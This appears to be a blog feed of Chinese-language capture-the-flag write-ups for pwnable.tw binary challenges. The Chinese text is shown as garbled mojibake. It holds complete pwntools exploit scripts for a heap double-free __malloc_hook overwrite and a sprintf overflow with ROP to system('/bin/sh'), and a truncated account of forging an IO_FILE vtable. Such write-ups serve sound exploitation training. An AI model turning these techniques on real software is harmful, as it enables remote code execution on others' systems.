    <content type="html"><![CDATA[<h1 id="secretgarden"><a href="#secretgarden" class="headerlink" title="secretgarden"></a>secretgarden</h1><pre><code>Arch:     amd64-64-littleRELRO:    Full RELROStack:    Canary foundNX:       NX enabledPIE:      PIE enabledFORTIFY:  Enabled</code></pre><p>ï¼ˆä¿æŠ¤å…¨å¼€å¥½å¯æ€•55</p><p>èœå•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† </span><br><span class="line">â˜†          Secret Garden          â˜† </span><br><span class="line">â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† â˜† </span><br><span class="line"></span><br><span class="line">  1 . Raise a flower </span><br><span class="line">  2 . Visit the garden </span><br><span class="line">  3 . Remove a flower from the garden</span><br><span class="line">  4 . Clean the garden</span><br><span class="line">  5 . Leave the garden</span><br></pre></td></tr></table></figure><p>removeæ²¡æœ‰ç½®é›¶ï¼Œæœ‰double freeæ¼æ´</p><ol><li>ç”³è¯·unsorted binæ³„éœ²libc</li><li>double freeä¿®æ”¹fdåˆ°__malloc_hookç­‰ï¼Œæ”¹mallocä¸ºone_gadgetï¼Œä¸è¿‡è¿™é‡Œï¼Œoneçš„æ¡ä»¶éƒ½ä¸ç¬¦åˆï¼Œæ‰€ä»¥éœ€è¦è§¦å‘<code>malloc_printerr</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[+] malloc_addr = 0x7f4f71258c30</span><br><span class="line">pwndbg&gt; x/10gx 0x7f4f71258c00</span><br><span class="line">0x7f4f71258c00 &lt;_IO_wide_data_0+288&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f4f71258c10 &lt;_IO_wide_data_0+304&gt;:0x00007f4f71254d600x0000000000000000</span><br><span class="line">0x7f4f71258c20 &lt;__memalign_hook&gt;:0x00007f4f70f044800x00007f4f70f05800</span><br><span class="line">0x7f4f71258c30 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f4f71258c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x7f4f71258c30-0x23</span><br><span class="line">0x7f4f71258c0d &lt;_IO_wide_data_0+301&gt;:0x4f71254d600000000x000000000000007f -------&gt; fake chunk</span><br><span class="line">0x7f4f71258c1d:0x4f70f044800000000x4f70f0580000007f</span><br><span class="line">0x7f4f71258c2d &lt;__realloc_hook+5&gt;:0x000000000000007f0x0000000000000000</span><br><span class="line">0x7f4f71258c3d:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f4f71258c4d &lt;main_arena+13&gt;:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æœ¬åœ°æ³„éœ²æ˜¯libcåŸºå€ï¼Œä½†æ˜¯è¿œç¨‹ï¼Œåç§»å°±ä¸å¯¹äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆæµ‹555ã€‚è€Œä¸”æœ¬åœ°double freeå¹¶ä¸èƒ½æˆåŠŸï¼Œä½†æ˜¯æ„Ÿè§‰æ²¡æ¯›ç—…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/python</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">binary = &quot;./secretgarden&quot;</span><br><span class="line">ip = &quot;chall.pwnable.tw&quot;</span><br><span class="line">port = 10203</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">io.sendlineafter(&quot;choice : &quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def sraise(length, name, color):</span><br><span class="line">menu(1)</span><br><span class="line">io.sendlineafter(&quot;name :&quot;, str(length))</span><br><span class="line">io.sendafter(&quot;name of flower :&quot;, name)</span><br><span class="line">io.sendlineafter(&quot;the flower :&quot;, color)</span><br><span class="line"></span><br><span class="line">def svisit():</span><br><span class="line">menu(2)</span><br><span class="line"></span><br><span class="line">def sremove(idx):</span><br><span class="line">menu(3)</span><br><span class="line">io.sendlineafter(&quot;garden:&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def sclean():</span><br><span class="line">menu(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(ip, port, debug):</span><br><span class="line">global io</span><br><span class="line">if debug == 1:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">one = [0x4f365, 0x4f3c2, 0x10a45c]</span><br><span class="line">main_arena_offset = 0x3ebc40</span><br><span class="line">else:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(&quot;libc_64.so.6&quot;)</span><br><span class="line">one = [0x45216, 0x4526a, 0xef6c4, 0xf0567]</span><br><span class="line">main_arena_offset = 0x3c3b20</span><br><span class="line"></span><br><span class="line">success(&quot;main_arena_offset = &quot;+hex(libc.sym[&apos;__malloc_hook&apos;]+0x10))</span><br><span class="line">sraise(0x30, &quot;a&quot;*8, &quot;y&quot;)# 0</span><br><span class="line">sraise(0x500, &quot;a&quot;*16, &quot;y&quot;)# 1</span><br><span class="line">sraise(0x30, &quot;a&quot;*8, &quot;y&quot;)# 2</span><br><span class="line">sremove(0)</span><br><span class="line">sremove(1)</span><br><span class="line">sraise(0x400, &quot;b&quot;*8, &quot;y&quot;)# 3</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">svisit()</span><br><span class="line">io.recvuntil(&quot;b&quot;*8)</span><br><span class="line">libc_base = u64(io.recv(6).ljust(8, &apos;\x00&apos;)) - 0x480 - main_arena_offset</span><br><span class="line">malloc_addr = libc_base + libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">one = libc_base + one[2]</span><br><span class="line">success(&quot;libc_base = &quot;+hex(libc_base))</span><br><span class="line">success(&quot;malloc_addr = &quot;+hex(malloc_addr))</span><br><span class="line">success(&quot;one_addr = &quot;+hex(one))</span><br><span class="line"></span><br><span class="line">sraise(0x68, &quot;c&quot;*8, &quot;y&quot;)# 4</span><br><span class="line">sraise(0x68, &quot;c&quot;*8, &quot;y&quot;)# 5</span><br><span class="line">sremove(4)</span><br><span class="line">sremove(5)</span><br><span class="line">sremove(4)</span><br><span class="line">sraise(0x68, p64(malloc_addr-0x23), &quot;y&quot;)# 6</span><br><span class="line"></span><br><span class="line">sraise(0x68, &quot;d&quot;*8, &quot;y&quot;)# 7</span><br><span class="line">sraise(0x68, &quot;d&quot;*8, &quot;y&quot;)# 8</span><br><span class="line">sraise(0x68, &quot;e&quot;*0x13+p64(one), &quot;y&quot;)# 9</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># io.sendlineafter(&quot;choice : &quot;, &quot;1&quot;)</span><br><span class="line"></span><br><span class="line">sremove(8)</span><br><span class="line">sremove(8)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">pwn(ip, port, 1)</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/" target="_blank" rel="noopener">https://blog.ivan0.com/2018/11/18/pwnable-tw-secretgarden/</a></p><p>è¿™ä¸ªç»™äº†ä¸¤ç§è§£æ³•ï¼ŒæŒºå¥½</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;secretgarden&quot;&gt;&lt;a href=&quot;#secretgarden&quot; class=&quot;headerlink&quot; title=&quot;secretgarden&quot;&gt;&lt;/a&gt;secretgarden&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;Arch:     amd64-64-lit</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw spirited_away wp</title>
    <link href="p1Kk.github.io/2020/07/29/tw/tw%20spirit/"/>
    <id>p1Kk.github.io/2020/07/29/tw/tw%20spirit/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-07-29T17:44:01.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="spirited-away"><a href="#spirited-away" class="headerlink" title="spirited_away"></a>spirited_away</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒæ˜æ˜¾çš„æ¼æ´å°±æ˜¯reasonæœªæ¸…é›¶ï¼Œå¯ä»¥è¿›è¡Œåœ°å€æ³„éœ²</p><p>å¦ä¸€ä¸ªæ¼æ´è¿˜æ˜¯æŒºå·§å¦™çš„ï¼Œåœ¨<code>sprintf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">char v1; // [esp+10h] [ebp-E8h]</span><br><span class="line">size_t nbytes; // [esp+48h] [ebp-B0h]</span><br></pre></td></tr></table></figure><p>v1å’Œnbytesä¹‹é—´çš„è·ç¦»æ˜¯0x38</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>length = len(<span class="string">"1 comment so far. We will review them as soon as we can"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(length)</span><br><span class="line"><span class="number">0x37</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>length = len(<span class="string">"11 comment so far. We will review them as soon as we can"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(length)</span><br><span class="line"><span class="number">0x38</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ cn &gt;= 100 æ—¶ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ° nbytes ä¸ºâ€nâ€å³ 0x6eï¼Œå¯ä»¥å¯¹name commentè¯»å–é€ æˆæº¢å‡º</p><ol><li><p>é€šè¿‡æ‰“å°reasonæ³„éœ²å‡ºstackå’Œlibcåœ°å€</p></li><li><p>åœ¨reasonå¤„ä¼ªé€ chunkï¼Œç„¶åcommentæº¢å‡ºå¯ä»¥è¦†ç›–nameï¼Œä¼ªé€ nameæŒ‡é’ˆæŒ‡å‘reason+0x10ï¼Œè¿™æ ·freeåå†æ¬¡mallocåˆ°reasonã€‚æ³¨æ„ä¼ªé€ çš„chunkçš„åˆæ³•æ€§ã€‚</p></li><li><p>å†æ¬¡å†™nameï¼Œå³å†™åˆ°reasonå¤„ï¼Œæº¢å‡ºrop</p></li></ol><p>ï¼ˆå¾ˆçƒ¦çš„æ˜¯ï¼Œæ¥æ”¶çš„æ—¶å€™ç²˜è¿ï¼Œåˆ°10çš„æ—¶å€™è¿˜è¦éƒ¨åˆ†å‘é€</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">"./spirited_away"</span></span><br><span class="line">ip = <span class="string">"chall.pwnable.tw"</span></span><br><span class="line">port = <span class="number">10204</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sname</span><span class="params">(name)</span>:</span></span><br><span class="line">io.sendlineafter(<span class="string">"name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sage</span><span class="params">(age)</span>:</span></span><br><span class="line">io.sendlineafter(<span class="string">"age: "</span>, str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sreason</span><span class="params">(reason)</span>:</span></span><br><span class="line">io.sendafter(<span class="string">"movie? "</span>, reason)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scomment</span><span class="params">(comment)</span>:</span></span><br><span class="line">io.sendafter(<span class="string">"your comment: "</span>, comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">again</span><span class="params">(choice)</span>:</span></span><br><span class="line">io.sendlineafter(<span class="string">"leave another comment? &lt;y/n&gt;: "</span>, choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(n, a, rs, com, ch, r=False)</span>:</span></span><br><span class="line">sname(n)</span><br><span class="line">sage(a)</span><br><span class="line">sreason(rs)</span><br><span class="line">scomment(com)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">if</span> r:</span><br><span class="line">gdb.attach(io)</span><br><span class="line">again(ch)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all2</span><span class="params">(a, rs, ch, r=False)</span>:</span></span><br><span class="line">sage(a)</span><br><span class="line">sreason(rs)</span><br><span class="line"><span class="keyword">if</span> r:</span><br><span class="line">gdb.attach(io)</span><br><span class="line">again(ch)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(ip, port, debug)</span>:</span></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(ip, port)</span><br><span class="line">libc = ELF(<span class="string">"libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line">sname(<span class="string">"kk"</span>)</span><br><span class="line">sage(<span class="number">11</span>)</span><br><span class="line">sreason(<span class="string">"x"</span>*<span class="number">0x38</span>)</span><br><span class="line">scomment(<span class="string">"aaaa"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"x"</span>*<span class="number">0x38</span>)</span><br><span class="line">stack_reason = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x70</span></span><br><span class="line"><span class="comment"># profile_addr = u32(io.recv(4))# none _dl_runtime_profile</span></span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">fflush_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = fflush_addr - <span class="number">0xb</span> - libc.sym[<span class="string">'fflush'</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">success(<span class="string">"stack_reason = "</span>+hex(stack_reason))</span><br><span class="line">success(<span class="string">"libc_base = "</span> +hex(libc_base))</span><br><span class="line">success(<span class="string">"sys_addr = "</span>+hex(sys_addr))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">again(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">all(<span class="string">"kk"</span>, <span class="number">11</span>, <span class="string">"xxxx"</span>, <span class="string">"aaaa"</span>, <span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>):</span><br><span class="line">all2(<span class="number">11</span>, <span class="string">"xxxx"</span>, <span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">reason = p32(<span class="number">0</span>) + p32(<span class="number">0x41</span>) + <span class="string">'a'</span>*<span class="number">0x38</span> + p32(<span class="number">0</span>) + p32(<span class="number">0x11</span>)</span><br><span class="line">comment = <span class="number">0x54</span>*<span class="string">'b'</span> + p32(stack_reason+<span class="number">0x8</span>)</span><br><span class="line">all(<span class="string">"kk"</span>, <span class="number">11</span>, reason, comment, <span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">'b'</span>*<span class="number">0x4c</span> + p32(sys_addr) + p32(<span class="number">0</span>) + p32(binsh_addr)</span><br><span class="line">all(name, <span class="number">11</span>, <span class="string">'xxxx'</span>, <span class="string">'aaaa'</span>, <span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"stack_reason = "</span>+hex(stack_reason))</span><br><span class="line">success(<span class="string">"libc_base = "</span> +hex(libc_base))</span><br><span class="line">success(<span class="string">"sys_addr = "</span>+hex(sys_addr))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">pwn(ip, port, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;spirited-away&quot;&gt;&lt;a href=&quot;#spirited-away&quot; class=&quot;headerlink&quot; title=&quot;spirited_away&quot;&gt;&lt;/a&gt;spirited_away&lt;/h1&gt;&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; cla</summary>
      
    
    
    
    <category term="oj" scheme="p1Kk.github.io/categories/oj/"/>
    
    
    <category term="pwn" scheme="p1Kk.github.io/tags/pwn/"/>
    
    <category term="wp" scheme="p1Kk.github.io/tags/wp/"/>
    
    <category term="tw" scheme="p1Kk.github.io/tags/tw/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw seethefile wp</title>
    <link href="p1Kk.github.io/2020/07/22/tw/tw%20seethefile/"/>
    <id>p1Kk.github.io/2020/07/22/tw/tw%20seethefile/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-07-22T06:52:26.935Z</updated>
    
    <content type="html"><![CDATA[<h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æœ€åexitçš„æ¼æ´å¾ˆæ˜æ˜¾äº†ï¼Œå†çœ‹bssï¼Œå¯ä»¥è¦†å†™fpï¼Œä»¥å‰å­¦äº†ä¸€ç‚¹[IOï¼ˆç¬”è®°](<a href="https://p1kk.github.io/2019/10/22/FILE" target="_blank" rel="noopener">https://p1kk.github.io/2019/10/22/FILE</a> structure used with â€œstream functionsâ€/FILE structure used with â€œstream functionsâ€/#libc2-23åŠä¹‹å‰ç‰ˆæœ¬çš„libcä¸‹ä¼ªé€ vtableåŠ«æŒ)â€¦ä¸è¿‡å¿˜äº†=ã€‚=å¤ä¹ å¤ä¹ </p><p>ä¸»è¦çœ‹çœ‹fclose  </p><p><code>_IO_unlink_it</code>å°†æŒ‡å®šFILEä»_chainé“¾è¡¨ä¸­è„±é“¾<br><code>_IO_file_close_it</code> â€“&gt;  <code>close</code> â€“&gt; ã€vtableä¸­<code>_IO_finish</code> â€“&gt; <code>_IO_file_finish</code> â€“&gt; <code>free</code>ã€‘</p><p>æ‰€ä»¥å°è¯•å°†</p><p>è¯»<code>/proc/self/maps</code>æ–‡ä»¶ï¼Œæ‰“å°å‡ºæ•ˆæœç±»äº<code>vmmap</code>ï¼Œå°±å¯ä»¥å¾—åˆ°libc base</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ strings libc_32.so.6 | grep GNU</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">GNU Libidn by Simon Josefsson</span><br></pre></td></tr></table></figure><p>libcç‰ˆæœ¬æ˜¯2.23</p><p><strong>åœ¨libc2.23ç‰ˆæœ¬ä¸‹ï¼Œ32ä½çš„vtableåç§»ä¸º<code>0x94</code>ï¼Œ64ä½çš„åç§»ä¸º<code>0xd8</code>ã€‚</strong></p><p>å°†io_fileä¼ªé€ æˆè¿™æ ·çš„æ•ˆæœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x804B260)# name_addr</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x68732f &lt;error: Cannot access memory at address 0x68732f&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x804b260 &lt;name&gt; &quot;/bin/sh&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x804b270 &lt;name+16&gt;, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 39 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x804b2b4</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *((struct _IO_jump_t*)0x804b2b4) # vtable_addr</span><br><span class="line">$2 = &#123;</span><br><span class="line">  __dummy = 0, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x0, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  